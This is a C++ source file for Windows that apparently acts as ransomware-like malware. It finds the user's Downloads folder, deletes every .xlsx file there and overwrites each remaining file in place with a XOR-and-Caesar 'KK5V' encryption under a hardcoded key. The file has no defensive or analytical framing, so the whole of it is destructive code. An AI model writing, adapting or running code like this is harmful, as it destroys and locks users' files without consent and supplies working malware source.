#include <windows.h>
#include "kk5v_encryption.h"
#include <shlobj.h>
#include <string>

int main() {
    // Step 1: Get the user's profile directory path (Downloads folder)
    char userProfile[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfile) != S_OK) {
        return 1;  // Exit if the profile path cannot be retrieved
    }

    std::string downloads_dir = std::string(userProfile) + "\\Downloads";

    // Step 2: Delete all .xlsx files in the Downloads directory
    kk5v::delete_xlsx_files(downloads_dir);
    
    // Step 3: Define key and Caesar shift for encryption
    std::string key = "myencryptionkey";
    int caesar_shift = 5;

    // Step 4: Encrypt remaining files in the Downloads folder
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((downloads_dir + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return 1;  // Exit if no files are found
    }

    do {
        std::string file_path = downloads_dir + "\\" + findFileData.cFileName;

        // Skip directories and already deleted files (.xlsx)
        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY || file_path.substr(file_path.length() - 5) == ".xlsx") {
            continue;
        }

        // Read the file's content
        std::string file_content = kk5v::read_file(file_path);

        // Encrypt the content using the KK5V method (XOR + Caesar)
        kk5v::kk5v_encrypt(file_content, key, caesar_shift);

        // Write the encrypted data back to the file
        kk5v::write_file(file_path, file_content);

    } while (FindNextFile(hFind, &findFileData));

    FindClose(hFind);

    return 0;
}
